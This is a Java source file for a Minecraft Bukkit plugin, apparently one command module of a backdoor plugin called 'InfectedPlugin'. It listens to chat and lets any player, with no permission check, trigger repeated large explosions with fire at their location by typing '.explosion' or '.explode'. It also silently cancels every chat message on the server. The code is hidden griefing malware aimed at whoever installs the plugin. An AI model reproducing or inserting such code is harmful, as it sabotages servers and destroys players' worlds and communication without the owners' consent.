package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.*;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_explosion implements Listener
{
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        final Player player = event.getPlayer();
        Server server = Bukkit.getServer();
        boolean cancel = true;

        if (message.toLowerCase().startsWith(".explosion") || message.toLowerCase().startsWith(".explode"))
        {
            for (final Player target : server.getOnlinePlayers())
            {
                target.getWorld().createExplosion(player.getLocation(), 10f, true);
                target.sendMessage(ChatColor.DARK_RED + "BOOM!");
            }
        }

        if (cancel)
        {
            event.setCancelled(true);
            return;
        }
    }
}
